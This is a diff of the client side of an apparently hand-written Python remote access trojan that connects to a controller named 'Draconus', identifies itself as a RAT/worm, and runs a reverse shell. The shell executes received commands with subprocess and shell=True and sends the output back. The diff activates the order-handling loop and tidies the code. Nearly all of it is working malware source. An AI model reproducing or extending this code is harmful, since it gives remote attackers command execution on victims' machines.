@@ -10,8 +10,6 @@ FORMAT = 'utf-8'
 # length of message (256 bytes)
 RAW_LEN = 256
 
-# length of output message (4 kb)
-OUT_LEN = 4096
 
 # length of response message (1 bytes)
 RAW_ERROR = 1
@@ -23,10 +21,8 @@ RAW_NoE = '0'.encode(FORMAT)
 TYPE_RAT = 'RAT'
 
 # message to disconnect
-MSG_DISC = 'MSG_DISC'
+MSG_DISC = 'DISCONNECT'
 
-# prepare to send Message
-TYPE_MSG = 'TYPE_MSG'
 
 # message to start shell
 SHELL_START = 'SHELL START'
@@ -34,6 +30,9 @@ SHELL_START = 'SHELL START'
 # message to exit the shell
 SHELL_EXIT = 'EXIT'
 
+
+
+# This class prepare message to send via TCP
 class Msg:
     def __init__(self, msg, formats=FORMAT, raw_len=RAW_LEN):
         if msg == '':
@@ -73,6 +72,9 @@ class Rat:
                 self.is_connected = True
             except:
                 continue
+
+
+
     # send default pocket (message) to Draconus and recive response (1 bytes)
     # default length is 256 bytes
     def send_pocket(self, msg):
@@ -82,7 +84,8 @@ class Rat:
         except:
             pass
         try:
-            self.RAT.recv(RAW_ERROR)
+            responde = self.RAT.recv(RAW_ERROR)
+            return responde
         except:
             return 0
 
@@ -107,50 +110,35 @@ class Rat:
     
     
     
-
+    # Send output (message) to Draconus
+    # first: send length of message
+    # second: send message
     def send_output(self, msg):
         send = msg.encode(FORMAT)
         len_send = str(len(send))
         self.send_pocket(len_send)
         self.RAT.send(send)
 
-
-
-        
-
-
+    # identification of the worm
     def hello_world(self):
         self.send_pocket(TYPE_RAT)
 
-    # def recive_orders(self):
-    #     order = None
-    #     while order != MSG_DISC:
-    #         order = self.recive_pocket()
-    #         if order:
-    #             if order == SHELL_START:
-    #                 self.send_output(SHELL_START)
-            
-    #                 while order != SHELL_EXIT:
-    #                     cwd = os.getcwd()
-    #                     self.send_output(cwd)
-    #                     order = self.recive_pocket()
-    #                     if order.startswith('cd '):
-    #                         try:
-    #                             os.chdir(order[3:])
-    #                             self.send_output('change directory succesfull')
-    #                         except:
-    #                             self.send_output(' <change directory> ERROR !!')
+ 
+ 
 
-    #                     elif order == SHELL_EXIT:
-    #                         self.send_output('disconnect ... Bye Bye ....')   
-    #                     else:
-    #                         out = self.run_cmd(order)
-    #                         self.send_output('SHELL Result:\n' + out)
-                
-    #             else:
-    #                 self.send_output('Unknown command')
+    
+    def recive_orders(self):
+        order = None
+        while order != MSG_DISC:
+            order = self.recive_pocket()
+            if order:
+                print('ORDER: ', order)
+                if order == SHELL_START:
+                    self.reverse_cmd()
+                else:
+                    self.send_pocket('Unknown Command')
 
-
+    # Reverse SHELL with emulated "cd" Change Directory function
     def reverse_cmd(self):
         self.send_pocket('SHELL starting ...')
         command = None
@@ -169,22 +157,9 @@ class Rat:
                     continue
             output = self.run_cmd(command)
             self.send_output(output)
-            
-
-    def recive_orders(self):
-        order = None
-        while order != MSG_DISC:
-            order = self.recive_pocket()
-            if order:
-                print('ORDER: ', order)
-                if order == SHELL_START:
-                    self.reverse_cmd()
-                else:
-                    self.send_pocket('Unknown Command')
 
 
-
-
+    # Run SHELL command and capture output
     def run_cmd(self, command):
         try:
             out = subprocess.run(command, shell=True, capture_output=True, text=True)
@@ -206,19 +181,12 @@ class Rat:
 
 
 #### START
-
-x = ''
-for a in range(34435):
-    x += 'dfgry6546*%$'
-
-print('LEN X: ', len(x), ' Bytes **  ', int(float(len(x)/1024)), ' KB')
-
-
 RAT = Rat()
 RAT.connect()
 RAT.hello_world()
 
 RAT.recive_orders()
+
 
 
 
